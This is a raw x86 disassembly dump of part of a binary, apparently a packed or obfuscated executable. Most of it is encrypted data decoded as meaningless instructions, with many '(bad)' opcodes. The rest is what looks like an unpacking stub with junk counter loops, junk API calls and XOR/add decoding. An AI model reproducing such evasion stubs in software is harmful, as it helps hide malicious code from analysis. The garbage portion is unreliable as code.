  409961:	test   DWORD PTR [edi-0x7afb4cc5],0x9d68c1f2
  40996b:	fnstcw WORD PTR ds:0xd85de924
  409971:	ds fs push ecx
  409974:	aas    
  409975:	or     DWORD PTR [edx-0x14],edi
  409978:	rol    ecx,0x4e
  40997b:	dec    BYTE PTR [edi+0x281c6691]
  409981:	pop    ebp
  409982:	or     edx,DWORD PTR [eax]
  409984:	ja     0x40990e
  409986:	mov    al,ds:0x9afc7df2
  40998b:	pop    ebx
  40998c:	mov    BYTE PTR [edx],ah
  40998e:	frstor [ecx*4+0x55460fc8]
  409995:	and    esi,DWORD PTR [ebx-0x26762d63]
  40999b:	jo     0x40995e
  40999d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40999e:	push   0x77
  4099a0:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4099a2:	(bad)  
  4099a3:	(bad)  
  4099a5:	sub    ebx,DWORD PTR [ebp+0x37f120f0]
  4099ab:	cmp    ah,ah
  4099ad:	add    eax,0x45df5402
  4099b2:	add    BYTE PTR [edi+edi*8-0x12f1e374],ch
  4099b9:	mov    esi,ebp
  4099bb:	pop    edi
  4099bc:	loopne 0x409949
  4099be:	lahf   
  4099bf:	lock ret 0x9e6b
  4099c3:	loop   0x409a07
  4099c5:	fild   QWORD PTR [ecx]
  4099c7:	jb     0x409a3f
  4099c9:	ret    
  4099ca:	inc    ebx
  4099cb:	xchg   ebp,eax
  4099cc:	mov    ds:0x520d6c0c,al
  4099d1:	mov    esp,0x2115c28d
  4099d6:	dec    ebp
  4099d7:	add    bh,BYTE PTR [ecx+0x74828492]
  4099dd:	stc    
  4099de:	xor    ebp,DWORD PTR [eax+esi*8+0x4da287cd]
  4099e5:	(bad)  
  4099e6:	sub    eax,0xb049345a
  4099eb:	adc    eax,0xe858b6f8
  4099f0:	scas   eax,DWORD PTR es:[edi]
  4099f1:	sub    BYTE PTR [ecx+0x44],dh
  4099f4:	(bad)  
  4099f5:	fldcw  WORD PTR [edx-0x49]
  4099f8:	fwait
  4099f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4099fa:	lods   al,BYTE PTR ds:[esi]
  4099fb:	jl     0x409983
  4099fd:	pusha  
  4099fe:	dec    ebp
  4099ff:	xor    eax,0xb257c20a
  409a04:	dec    ebp
  409a05:	pop    ecx
  409a06:	in     al,0x95
  409a08:	retf   
  409a09:	pop    esp
  409a0a:	push   ss
  409a0b:	mov    al,ds:0x788e0e17
  409a10:	mov    cl,0x1
  409a12:	cmp    DWORD PTR [edi+0x72],esi
  409a15:	push   ds
  409a16:	cmp    ah,BYTE PTR [eax+0xc16f322]
  409a1c:	jmp    0xe52d74b1
  409a21:	push   es
  409a22:	dec    esp
  409a23:	fist   DWORD PTR [ebx]
  409a25:	adc    eax,0xeedcc10a
  409a2a:	ret    0x4ec7
  409a2d:	pop    ds
  409a2e:	mov    esi,gs
  409a30:	sbb    eax,ecx
  409a32:	jmp    0x1b1a:0xdea6069
  409a39:	dec    ecx
  409a3a:	dec    esi
  409a3b:	push   cs
  409a3c:	out    0xa8,eax
  409a3e:	adc    al,0xa6
  409a40:	xchg   edi,eax
  409a41:	repnz out 0xce,al
  409a44:	mov    ecx,0xa7200b57
  409a49:	mov    edi,0x6f6a0271
  409a4e:	add    al,0xef
  409a50:	sbb    BYTE PTR [ecx-0x5e],ah
  409a53:	pop    esp
  409a54:	popf   
  409a55:	mov    bl,0x38
  409a57:	mov    ecx,0x3d8b259d
  409a5c:	mov    edi,0xf496be76
  409a61:	cmp    cl,BYTE PTR [edx+0x5d]
  409a64:	scas   eax,DWORD PTR es:[edi]
  409a65:	mov    edx,0x47d30f82
  409a6a:	push   ebx
  409a6b:	sbb    cl,BYTE PTR [eax+0x2736fade]
  409a71:	or     ecx,ebx
  409a73:	mov    cl,0x77
  409a75:	out    0xeb,eax
  409a77:	leave  
  409a78:	jmp    0x370c56cc
  409a7d:	nop
  409a7e:	mov    dl,0x12
  409a80:	sub    edi,edi
  409a82:	adc    DWORD PTR [eax+0x2c],edi
  409a85:	sbb    eax,DWORD PTR [ebp-0x196ea8a8]
  409a8b:	out    dx,eax
  409a8c:	or     eax,0xd53083ec
  409a91:	sub    al,0x85
  409a93:	and    BYTE PTR ds:0xdbdcbc34,0xfc
  409a9b:	sbb    al,0xfd
  409a9d:	popf   
  409a9e:	repz iret 
  409aa0:	xchg   ebp,eax
  409aa1:	cmp    BYTE PTR [ebx-0xf0e9d48],dl
  409aa7:	pop    ecx
  409aa8:	push   edi
  409aa9:	out    0x18,al
  409aab:	bnd jbe 0x409a93
  409aae:	mov    edx,0x4f8a0f9c
  409ab3:	outs   dx,BYTE PTR ds:[esi]
  409ab4:	fs xchg esp,eax
  409ab6:	fcom   DWORD PTR [ebp-0x29]
  409ab9:	(bad)  
  409aba:	and    DWORD PTR [esi+0x644b8d60],ecx
  409ac0:	mov    bh,0x4c
  409ac2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409ac4:	or     al,0x2b
  409ac6:	fmulp  st(4),st
  409ac8:	test   BYTE PTR [ebp-0x67cdc3b7],bh
  409ace:	xor    eax,0x890b167d
  409ad3:	sub    ecx,DWORD PTR [ebp+0x7e6c98f0]
  409ad9:	mov    ch,0xfd
  409adb:	lahf   
  409adc:	sbb    BYTE PTR [eax+0x62],ch
  409adf:	or     al,0x7b
  409ae1:	lea    esp,[eax+0x569b4a60]
  409ae7:	pusha  
  409ae8:	(bad)  
  409ae9:	dec    ebp
  409aea:	sahf   
  409aeb:	mov    DWORD PTR [ebp-0x60d3fbef],esp
  409af1:	shl    dl,cl
  409af3:	bound  ebp,QWORD PTR [edi+edi*4-0x54]
  409af7:	stos   BYTE PTR es:[edi],al
  409af8:	inc    ebp
  409af9:	ror    BYTE PTR ds:0xb13a3b7d,0x58
  409b00:	test   al,0x61
  409b02:	je     0x409b75
  409b04:	cmp    DWORD PTR [esi+0x76],esp
  409b07:	mov    eax,ds:0x6b7c89ba
  409b0c:	in     al,0x79
  409b0e:	repz jmp 0xdeec67bc
  409b14:	jnp    0x409b41
  409b16:	in     eax,dx
  409b17:	inc    ecx
  409b18:	mov    ah,BYTE PTR [esi+edx*8]
  409b1b:	xor    al,0x5a
  409b1d:	mov    ds:0xebfc3a65,al
  409b22:	sub    DWORD PTR [edx+ebx*4-0x319ae8fd],esp
  409b29:	lods   eax,DWORD PTR ds:[esi]
  409b2a:	push   ss
  409b2b:	sbb    cl,ch
  409b2d:	out    dx,eax
  409b2e:	cmp    al,0xe9
  409b30:	jno    0x409b92
  409b32:	sub    BYTE PTR [edi-0x2e594488],0xdc
  409b39:	test   eax,0xdd60a063
  409b3e:	popa   
  409b3f:	xor    eax,0xa0ece98d
  409b44:	out    0x32,al
  409b46:	sahf   
  409b47:	push   0x83269aa8
  409b4c:	and    edx,DWORD PTR [ecx+0x49]
  409b4f:	ret    
  409b50:	enter  0x9aad,0x16
  409b54:	aas    
  409b55:	ins    BYTE PTR es:[edi],dx
  409b56:	pop    ebx
  409b57:	add    ecx,DWORD PTR [eax+0x29]
  409b5a:	push   ecx
  409b5b:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409b5d:	adc    bl,BYTE PTR [edx+0x168f1602]
  409b63:	stc    
  409b64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409b65:	jmp    0x82e6:0xb889eed9
  409b6c:	hlt    
  409b6d:	or     al,BYTE PTR ds:0x9e0ee9cf
  409b73:	mov    cl,0x73
  409b75:	add    BYTE PTR [ecx-0x33],bh
  409b78:	mov    cl,0x22
  409b7a:	sti    
  409b7b:	fdivr  DWORD PTR [ecx-0x1f]
  409b7e:	das    
  409b7f:	popa   
  409b80:	and    eax,0x9ba122a5
  409b85:	pop    ds
  409b86:	gs repnz sub eax,0x8cc4c29d
  409b8d:	xor    al,0x5d
  409b8f:	shl    DWORD PTR [eax-0x7ddaf021],cl
  409b95:	push   ecx
  409b96:	sbb    eax,0x151e2217
  409b9b:	in     al,0x1
  409b9d:	mov    DWORD PTR ds:0x7e6aa357,esp
  409ba3:	hlt    
  409ba4:	inc    ebx
  409ba5:	shl    DWORD PTR ds:0xad6577f5,1
  409bab:	mov    esp,0x59330973
  409bb0:	sub    eax,0x954f1d21
  409bb5:	jg     0x409b6b
  409bb7:	adc    DWORD PTR ds:0xf5d9f6b3,0x2f6f346b
  409bc1:	cld    
  409bc2:	scas   al,BYTE PTR es:[edi]
  409bc3:	ins    BYTE PTR es:[edi],dx
  409bc4:	mov    esp,0xd9b48ad5
  409bc9:	cmp    bl,BYTE PTR [ecx+0x320a5f78]
  409bcf:	(bad)  
  409bd0:	in     eax,0x72
  409bd2:	mov    eax,0xc75b2e0c
  409bd7:	sub    eax,0xe91ea7bb
  409bdc:	adc    BYTE PTR [edi],ch
  409bde:	adc    edi,DWORD PTR [ecx]
  409be0:	xchg   ecx,eax
  409be1:	mov    dl,0xcd
  409be3:	push   eax
  409be4:	icebp  
  409be5:	movlps xmm1,QWORD PTR [ebx-0x739d2281]
  409bec:	mov    dl,0x87
  409bee:	sub    BYTE PTR [ecx],ch
  409bf0:	sub    eax,0x9d86155d
  409bf5:	and    BYTE PTR gs:[ebp-0x6b2ffefb],ah
  409bfc:	loope  0x409c5c
  409bfe:	test   DWORD PTR [ebx-0x57539dcc],edi
  409c04:	cmp    BYTE PTR [edx],al
  409c06:	jl     0x409c83
  409c08:	mov    bl,0xf0
  409c0a:	sbb    edi,DWORD PTR [edx+0x392035ca]
  409c10:	(bad)  
  409c11:	sar    dh,cl
  409c13:	popa   
  409c14:	rol    DWORD PTR [edx-0x7a5889e6],0x35
  409c1b:	jg     0x409c6d
  409c1d:	shl    esi,cl
  409c1f:	or     al,0xc0
  409c21:	daa    
  409c22:	iret   
  409c23:	into   
  409c24:	pop    edi
  409c25:	adc    BYTE PTR ds:0x19b1ab78,bl
  409c2b:	aad    0x3f
  409c2d:	sub    BYTE PTR [edi-0x75],bh
  409c30:	or     cl,BYTE PTR [ebp-0x62]
  409c33:	test   BYTE PTR [eax+0x6e],bh
  409c36:	push   ebp
  409c37:	ret    0xb8c8
  409c3a:	mov    ebx,0xa6fd2f1d
  409c3f:	jbe    0x409c0a
  409c41:	add    ebp,DWORD PTR [esp+edx*8-0x5a]
  409c45:	in     al,dx
  409c46:	imul   eax,DWORD PTR [ebx+edx*8-0x683d5dd9],0x5d
  409c4e:	pop    ecx
  409c4f:	aam    0x10
  409c51:	std    
  409c52:	das    
  409c53:	jb     0x409c74
  409c55:	out    0xa4,al
  409c57:	cli    
  409c58:	in     al,0x97
  409c5a:	retf   
  409c5b:	fldcw  WORD PTR [eax]
  409c5d:	retf   0x96e4
  409c60:	dec    ecx
  409c61:	jns    0x409bfc
  409c63:	dec    esp
  409c64:	jp     0x409c9c
  409c66:	dec    edx
  409c67:	cmp    al,0x30
  409c69:	and    al,0xbd
  409c6b:	xchg   edi,eax
  409c6c:	bnd jnp 0x409c60
  409c6f:	aad    0x81
  409c71:	push   ebx
  409c72:	out    0x9d,eax
  409c74:	and    bh,bl
  409c76:	stc    
  409c77:	xchg   ecx,eax
  409c78:	pop    eax
  409c79:	jp     0x409cb6
  409c7b:	(bad)  
  409c7d:	cld    
  409c7e:	(bad)  
  409c7f:	mov    esi,0x927247f8
  409c84:	or     ecx,DWORD PTR [edx]
  409c86:	test   DWORD PTR [ecx],0xdcd8085d
  409c8c:	std    
  409c8d:	ds into 
  409c8f:	sub    edx,edx
  409c91:	dec    eax
  409c92:	mov    bh,0x1f
  409c94:	(bad)  
  409c96:	out    dx,eax
  409c97:	(bad)  
  409c98:	pop    ds
  409c99:	mov    ah,0xea
  409c9b:	xchg   ebp,eax
  409c9c:	add    DWORD PTR [eax],0xcb158272
  409ca2:	xchg   ecx,eax
  409ca3:	xchg   esi,eax
  409ca4:	inc    edx
  409ca5:	test   eax,0x30a01a6a
  409caa:	sub    eax,0x64bb247
  409caf:	test   al,0x17
  409cb1:	cmp    bh,bh
  409cb3:	adc    dh,dh
  409cb5:	into   
  409cb6:	pop    edi
  409cb7:	inc    ebx
  409cb8:	loopne 0x409cab
  409cba:	int3   
  409cbb:	jb     0x409d00
  409cbd:	jae    0x409cb4
  409cbf:	jle    0x409d19
  409cc1:	jge    0x409ce7
  409cc3:	sub    esi,edx
  409cc5:	add    esi,edi
  409cc7:	jge    0x409d2a
  409cc9:	arpl   WORD PTR [ebp+ebp*4-0xa],bp
  409ccd:	and    al,BYTE PTR [edi+0x65]
  409cd0:	or     eax,0x2344e317
  409cd5:	gs inc ecx
  409cd7:	es sar ch,0xba
  409cdb:	push   ss
  409cdc:	cs enter 0x10ff,0xd
  409ce1:	fdivr  DWORD PTR [esi+0x51]
  409ce4:	add    dl,BYTE PTR [edi+0x42]
  409ce7:	add    al,0x97
  409ce9:	fsubr  DWORD PTR [ebx]
  409ceb:	in     al,0x6b
  409ced:	and    ah,cl
  409cef:	mov    ecx,0x8a3df995
  409cf4:	xchg   ecx,eax
  409cf5:	hlt    
  409cf6:	rcr    BYTE PTR [ecx+0x7e39fca8],1
  409cfc:	and    cl,BYTE PTR [ecx-0x34b5762b]
  409d02:	mov    bh,0x18
  409d04:	xchg   esp,eax
  409d05:	rcl    BYTE PTR [edi-0x7c9d92a5],1
  409d0b:	push   ds
  409d0c:	imul   esp,ebx,0x44c29a3e
  409d12:	sti    
  409d13:	dec    esi
  409d14:	jge    0x409d55
  409d16:	sub    DWORD PTR [edx],ecx
  409d18:	lea    esp,[esi-0x73]
  409d1b:	aaa    
  409d1c:	mov    cl,bl
  409d1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409d1f:	out    dx,eax
  409d20:	test   al,0x8
  409d22:	shl    BYTE PTR [edx+0x6c],cl
  409d25:	rol    BYTE PTR [edx*8+0x5f7844ec],1
  409d2c:	call   0x5194:0xb36f1a7f
  409d33:	inc    eax
  409d34:	(bad)  
  409d35:	mov    esi,0xbb51d5a
  409d3a:	and    eax,0x2273e383
  409d3f:	jnp    0x409d15
  409d41:	cmp    eax,0x4f69c436
  409d46:	mov    ds:0xe3076697,eax
  409d4b:	dec    esp
  409d4c:	out    0x11,eax
  409d4e:	ret    
  409d4f:	mov    al,ds:0x4ebf8de2
  409d54:	cdq    
  409d55:	enter  0xa44f,0xd0
  409d59:	lods   al,BYTE PTR ds:[esi]
  409d5a:	mov    esp,DWORD PTR [edx]
  409d5c:	jl     0x409d8d
  409d5e:	mov    ecx,gs
  409d60:	and    al,0x97
  409d62:	arpl   WORD PTR [esi],sp
  409d64:	xor    dl,BYTE PTR [ebx-0x60b2f675]
  409d6a:	mov    ds:0x4059d6b3,eax
  409d6f:	mov    WORD PTR [ebx],ss
  409d71:	out    dx,eax
  409d72:	aad    0x25
  409d74:	or     al,0x44
  409d76:	into   
  409d77:	cli    
  409d78:	mov    dl,0x31
  409d7a:	aam    0x57
  409d7c:	and    BYTE PTR [esi+edx*8],ah
  409d7f:	mov    ch,0x21
  409d81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409d82:	mov    bh,BYTE PTR [ecx]
  409d84:	dec    eax
  409d85:	mov    ds:0x72329324,eax
  409d8a:	inc    ebp
  409d8b:	xlat   BYTE PTR ds:[ebx]
  409d8c:	push   esi
  409d8d:	mov    edi,0x21f40390
  409d92:	xchg   esi,eax
  409d93:	call   0x8bb9:0xec8c7cfa
  409d9a:	fst    QWORD PTR [ebp+0x648aa0d8]
  409da0:	jg     0x409df1
  409da2:	dec    esp
  409da3:	lock mov ch,BYTE PTR [ebx-0x6a37af50]
  409daa:	jnp    0x409da7
  409dac:	adc    edi,edx
  409dae:	jae    0x409d58
  409db0:	pop    es
  409db1:	outs   dx,BYTE PTR ds:[esi]
  409db2:	imul   edi,DWORD PTR [ecx-0x3d],0x12ed6842
  409db9:	test   al,0x68
  409dbb:	dec    ebx
  409dbc:	add    ecx,DWORD PTR [ecx]
  409dbe:	stos   BYTE PTR es:[edi],al
  409dbf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409dc0:	rcl    cl,0x9f
  409dc3:	push   edi
  409dc4:	jae    0x409deb
  409dc6:	jmp    0xdc82:0x4e05c963
  409dcd:	ja     0x409dba
  409dcf:	mov    DWORD PTR ds:0xbb31a107,0x6fa84a76
  409dd9:	xchg   edx,eax
  409dda:	push   ss
  409ddb:	cdq    
  409ddc:	xchg   edx,eax
  409ddd:	hlt    
  409dde:	and    BYTE PTR [esi+0x6],0xfc
  409de2:	or     DWORD PTR [ebx],0x77fbd078
  409de8:	lods   eax,DWORD PTR ds:[esi]
  409de9:	jp     0x409dc9
  409deb:	retf   
  409dec:	dec    ebx
  409ded:	sbb    BYTE PTR [ebp+0x31bfc95a],ah
  409df3:	cmc    
  409df4:	imul   ebx,DWORD PTR [esp+eiz*4-0x25],0xffffffda
  409df9:	dec    ebp
  409dfa:	ins    DWORD PTR es:[edi],dx
  409dfb:	in     al,dx
  409dfc:	mov    ch,0x3d
  409dfe:	gs std 
  409e00:	hlt    
  409e01:	sbb    eax,0x6b8ec8f2
  409e06:	cdq    
  409e07:	pop    ebx
  409e08:	es xor esp,ecx
  409e0b:	lock push ebx
  409e0d:	or     DWORD PTR [edx+0x58],edx
  409e10:	ins    BYTE PTR es:[edi],dx
  409e11:	mov    ebx,edi
  409e13:	cmp    DWORD PTR [edx+eax*1-0x39],edi
  409e17:	pop    ds
  409e18:	sbb    dl,dh
  409e1a:	call   0x5512ec44
  409e1f:	data16 clc 
  409e21:	cwde   
  409e22:	(bad)  
  409e24:	(bad)  
  409e25:	sti    
  409e26:	sbb    eax,0x992b2806
  409e2b:	jne    0x409e55
  409e2d:	out    dx,al
  409e2e:	loop   0x409e20
  409e30:	wbinvd 
  409e32:	or     DWORD PTR [edx+edi*4],ebp
  409e35:	shr    DWORD PTR [edx],1
  409e37:	mov    bh,dl
  409e39:	mov    esp,0x3dbe0d54
  409e3e:	in     al,0xfe
  409e40:	add    DWORD PTR [ebx+0x2c8f5b37],0xffffffec
  409e47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409e48:	adc    al,BYTE PTR [eax+0x54642de0]
  409e4e:	lahf   
  409e4f:	inc    ebx
  409e50:	mov    eax,ds:0xeb3afa51
  409e55:	sbb    al,0xc6
  409e57:	(bad)  
  409e58:	out    0x2c,eax
  409e5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409e5b:	fs mov ?,ebx
  409e5e:	xchg   edx,eax
  409e5f:	push   esi
  409e60:	xor    DWORD PTR [esi+0x2cd89c89],ecx
  409e66:	add    ah,BYTE PTR [ecx-0x651e889c]
  409e6c:	push   edi
  409e6d:	jne    0x409e16
  409e6f:	lahf   
  409e70:	push   es
  409e71:	mov    bl,0xea
  409e73:	pop    edx
  409e74:	pop    esp
  409e75:	xchg   DWORD PTR [esp+edi*4],ebp
  409e78:	xor    al,0x19
  409e7a:	stos   DWORD PTR es:[edi],eax
  409e7b:	sub    BYTE PTR [eax],cl
  409e7d:	jns    0x409e60
  409e7f:	out    0xfb,eax
  409e81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409e82:	xchg   ch,dh
  409e84:	mov    ebp,cr0
  409e87:	les    ebx,FWORD PTR [ecx+ebx*4]
  409e8a:	dec    ebx
  409e8b:	mov    ah,0xa0
  409e8d:	iret   
  409e8e:	out    0x72,eax
  409e90:	push   ecx
  409e91:	icebp  
  409e92:	and    eax,0x28cb94f2
  409e97:	pop    ebp
  409e98:	jl     0x409ea3
  409e9a:	aaa    
  409e9b:	je     0x409e87
  409e9d:	or     DWORD PTR [edx+edi*2-0x39],ebp
  409ea1:	mov    edi,0x9e998211
  409ea6:	mov    dl,0xc7
  409ea8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409ea9:	jns    0x409e61
  409eab:	add    cl,BYTE PTR [edi+0x5e]
  409eae:	xchg   esi,eax
  409eaf:	or     DWORD PTR [ecx],ebp
  409eb1:	cli    
  409eb2:	xchg   ah,bl
  409eb4:	(bad)  
  409eb5:	pop    esi
  409eb6:	ins    BYTE PTR es:[edi],dx
  409eb7:	dec    ecx
  409eb8:	xor    eax,0xa355509d
  409ebd:	sub    al,0x53
  409ebf:	sub    DWORD PTR [eax],ebp
  409ec1:	cmp    BYTE PTR [ecx-0x4afb1955],bl
  409ec7:	add    al,0xf6
  409ec9:	jnp    0x409e75
  409ecb:	mov    ebp,gs
  409ecd:	pushf  
  409ece:	sbb    al,0xfb
  409ed0:	pop    ebp
  409ed1:	pop    ebx
  409ed2:	popa   
  409ed3:	mov    al,ds:0xb749b679
  409ed8:	dec    esi
  409ed9:	sahf   
  409eda:	push   edx
  409edb:	xor    DWORD PTR [ebx],0x27282372
  409ee1:	and    ebx,DWORD PTR [edx-0x716c47e2]
  409ee7:	lods   al,BYTE PTR ds:[esi]
  409ee8:	mov    esp,ecx
  409eea:	nop
  409eeb:	popa   
  409eec:	sub    DWORD PTR [ebx+ecx*2+0x1f],esi
  409ef0:	mov    ebx,0xeff0166
  409ef5:	jp     0x409f3f
  409ef7:	mov    ds:0x7c10ac,al
  409efc:	adc    DWORD PTR ds:0x52cb1bfb,0xc4026bfa
  409f06:	call   0xe72c:0xd72d37b2
  409f0d:	xchg   esi,eax
  409f0e:	or     ecx,DWORD PTR [esi-0x5664aaa]
  409f14:	pop    ecx
  409f15:	loopne 0x409f5b
  409f17:	adc    BYTE PTR [esi],cl
  409f19:	enter  0xbb8f,0x15
  409f1d:	clc    
  409f1e:	ins    BYTE PTR es:[edi],dx
  409f1f:	daa    
  409f20:	hlt    
  409f21:	sub    BYTE PTR [esp+ebp*4-0x1d],dl
  409f25:	or     esp,DWORD PTR [esi+ebx*2-0x45838847]
  409f2c:	loope  0x409f7e
  409f2e:	or     esi,DWORD PTR [ebx-0x18]
  409f31:	out    0xd9,al
  409f33:	lods   al,BYTE PTR ds:[esi]
  409f34:	and    DWORD PTR ds:0xd1de1cff,ebx
  409f3a:	test   eax,0xc8f2776a
  409f3f:	cmp    eax,0x3a2e6c1f
  409f44:	pop    ebp
  409f45:	xor    eax,0x72668f91
  409f4a:	(bad)  
  409f4b:	fsubr  DWORD PTR [edx]
  409f4d:	mov    ebx,0x5b954c55
  409f52:	sub    BYTE PTR [ebx-0x3c],0x3b
  409f56:	pop    edx
  409f57:	test   DWORD PTR [ebx-0x216d589d],edx
  409f5d:	daa    
  409f5e:	call   0x9e09:0x3fabbf68
  409f65:	and    al,0xb7
  409f67:	scas   eax,DWORD PTR es:[edi]
  409f68:	repnz fs (bad) 
  409f6b:	push   edi
  409f6c:	mov    eax,0x99f04daa
  409f71:	outs   dx,DWORD PTR ds:[esi]
  409f72:	mov    bl,0x29
  409f74:	sbb    DWORD PTR [edi],ebx
  409f76:	imul   esp,DWORD PTR [ecx-0x25],0xf02f3bb3
  409f7d:	jmp    0x8bf47132
  409f82:	sbb    BYTE PTR [eax-0x7effffff],0x25
  409f89:	or     BYTE PTR [eax+0x42],dl
  409f8f:	add    BYTE PTR [eax],al
  409f91:	xor    edx,edx
  409f93:	add    edx,DWORD PTR ds:0x429008
  409f99:	inc    edx
  409f9a:	mov    DWORD PTR ds:0x429008,edx
  409fa0:	cmp    DWORD PTR ds:0x429008,0x11
  409fa7:	jne    0x409fe0
  409fad:	push   DWORD PTR [ebp-0x28]
  409fb0:	push   DWORD PTR [ebp-0xc]
  409fb3:	push   0x130f
  409fb8:	push   0x751a
  409fbd:	push   0x8a1e
  409fc2:	push   0x2320
  409fc7:	push   DWORD PTR [ebp-0x24]
  409fca:	push   0x206d
  409fcf:	push   DWORD PTR [ebp-0xc]
  409fd2:	push   DWORD PTR [ebp-0x20]
  409fd5:	push   0x5142
  409fda:	call   DWORD PTR ds:0x42e8db
  409fe0:	cmp    DWORD PTR ds:0x429008,0x10
  409fe7:	jne    0x409ffa
  409fed:	mov    edx,DWORD PTR ds:0x429008
  409ff3:	inc    edx
  409ff4:	mov    DWORD PTR ds:0x429008,edx
  409ffa:	cmp    DWORD PTR ds:0x429008,0x1e
  40a001:	jb     0x409f91
  40a007:	xor    edi,ecx
  40a009:	add    DWORD PTR ds:0x42d000,ebx
  40a00f:	mov    edx,0x3272e2
  40a014:	mov    DWORD PTR ds:0x42c010,0x65c3
  40a01e:	add    edi,edx
  40a020:	cmp    DWORD PTR [eax],edi
  40a022:	mov    DWORD PTR ds:0x42a00c,0xde
  40a02c:	je     0x40a043
  40a032:	mov    eax,DWORD PTR [eax]
  40a034:	mov    DWORD PTR ds:0x42c004,0x3704
  40a03e:	jmp    0x40ea3f
  40a043:	mov    eax,ds:0x42b010
  40a048:	mov    eax,DWORD PTR [ebp+0x18]
  40a04b:	cmp    eax,esi
  40a04d:	mov    DWORD PTR ds:0x42a00c,0x4db6
  40a057:	jne    0x40a071
  40a05d:	mov    DWORD PTR ds:0x42c008,0x3d03
  40a067:	push   0xf89c8584
  40a06c:	jmp    0x40ea2e
  40a071:	mov    esi,DWORD PTR [ebp+0x18]
  40a074:	mov    eax,0xf89c85bb
  40a079:	cmp    esi,eax
  40a07b:	mov    DWORD PTR ds:0x42b008,0x1a7e
  40a085:	jne    0x40ea1e
  40a08b:	sbb    eax,esi
  40a08d:	mov    eax,DWORD PTR [ebp+0x10]
  40a090:	and    DWORD PTR ds:0x42c010,0x0
  40a09a:	mov    esi,DWORD PTR ds:0x42c010
  40a0a0:	inc    esi
  40a0a1:	mov    DWORD PTR ds:0x42c010,esi
  40a0a7:	cmp    DWORD PTR ds:0x42c010,0x1f
  40a0ae:	jne    0x40a0cf
  40a0b4:	push   0x2683
  40a0b9:	push   DWORD PTR [ebp-0x20]
  40a0bc:	push   0x3e9b
  40a0c1:	push   DWORD PTR [ebp-0x20]
  40a0c4:	push   0x63df
  40a0c9:	call   DWORD PTR ds:0x42e8df
  40a0cf:	cmp    DWORD PTR ds:0x42c010,0x13
  40a0d6:	jb     0x40a09a
  40a0dc:	mov    DWORD PTR ds:0x42c008,0x14
  40a0e6:	cmp    DWORD PTR ds:0x42c008,0x0
  40a0ed:	je     0x40a126
  40a0f3:	cmp    DWORD PTR ds:0x42c008,0x1c
  40a0fa:	jne    0x40a106
  40a100:	call   DWORD PTR ds:0x42e91b
  40a106:	xor    esi,esi
  40a108:	xor    esi,DWORD PTR ds:0x42c008
  40a10e:	dec    esi
  40a10f:	mov    DWORD PTR ds:0x42c008,esi
  40a115:	jmp    0x40a0e6
  40a11a:	mov    esi,DWORD PTR ds:0x42901c
  40a120:	or     DWORD PTR ds:0x429020,esi
  40a126:	xor    eax,ecx
  40a128:	and    esi,DWORD PTR ds:0x42c018
  40a12e:	add    eax,edx
  40a130:	and    DWORD PTR ds:0x42c004,0x0
  40a13a:	xor    esi,esi
  40a13c:	add    esi,DWORD PTR ds:0x42c004
  40a142:	inc    esi
  40a143:	mov    DWORD PTR ds:0x42c004,esi
  40a149:	cmp    DWORD PTR ds:0x42c004,0xd
  40a150:	jne    0x40a164
  40a156:	push   0x6b46
  40a15b:	push   DWORD PTR [ebp-0x10]
  40a15e:	call   DWORD PTR ds:0x42e91f
  40a164:	cmp    DWORD PTR ds:0x42c004,0xc
  40a16b:	jne    0x40a180
  40a171:	xor    esi,esi
  40a173:	xor    esi,DWORD PTR ds:0x42c004
  40a179:	inc    esi
  40a17a:	mov    DWORD PTR ds:0x42c004,esi
  40a180:	cmp    DWORD PTR ds:0x42c004,0x1b
  40a187:	jb     0x40a13a
  40a18d:	xor    esi,esi
  40a18f:	xor    esi,DWORD PTR ds:0x42c010
  40a195:	or     esi,DWORD PTR ds:0x429000
  40a19b:	mov    DWORD PTR ds:0x42c010,esi
  40a1a1:	mov    DWORD PTR [ebp-0x18],eax
  40a1a4:	mov    eax,DWORD PTR [ebp+0xc]
  40a1a7:	mov    esi,DWORD PTR [ebp-0x8]
  40a1aa:	xor    eax,ecx
  40a1ac:	add    eax,edx
  40a1ae:	mov    DWORD PTR ds:0x429018,0x1094
  40a1b8:	imul   eax,DWORD PTR [esi]
  40a1bb:	and    DWORD PTR ds:0x42900c,0x0
  40a1c5:	mov    esi,DWORD PTR ds:0x42900c
  40a1cb:	inc    esi
  40a1cc:	mov    DWORD PTR ds:0x42900c,esi
  40a1d2:	cmp    DWORD PTR ds:0x42900c,0x1f
  40a1d9:	jne    0x40a1e8
  40a1df:	push   DWORD PTR [ebp-0x10]
  40a1e2:	call   DWORD PTR ds:0x42e8b7
  40a1e8:	cmp    DWORD PTR ds:0x42900c,0x1d
  40a1ef:	jb     0x40a1c5
  40a1f5:	mov    esi,DWORD PTR [ebp+0x8]
  40a1f8:	xor    esi,ecx
  40a1fa:	add    esi,edx
  40a1fc:	cmp    esi,eax
  40a1fe:	mov    eax,DWORD PTR [ebp-0x4]
  40a201:	push   ebx
  40a202:	je     0x40a221
  40a208:	mov    esi,DWORD PTR [ebp-0x18]
  40a20b:	add    DWORD PTR [eax],esi
  40a20d:	mov    eax,DWORD PTR [ebp-0x4]
  40a210:	mov    esi,DWORD PTR [ebp+0xc]
  40a213:	xor    esi,ecx
  40a215:	add    esi,edx
  40a217:	imul   esi,DWORD PTR [eax]
  40a21a:	mov    DWORD PTR [eax],esi
  40a21c:	jmp    0x40a226
  40a221:	mov    esi,DWORD PTR [ebp+0x14]
  40a224:	xor    DWORD PTR [eax],esi
  40a226:	mov    eax,DWORD PTR [ebp-0x4]
  40a229:	mov    edi,DWORD PTR [ebp+0x10]
  40a22c:	xor    edi,ecx
  40a22e:	mov    esi,0xffcd8d1e
  40a233:	mov    ebx,esi
  40a235:	sub    ebx,edi
  40a237:	add    DWORD PTR [eax],ebx
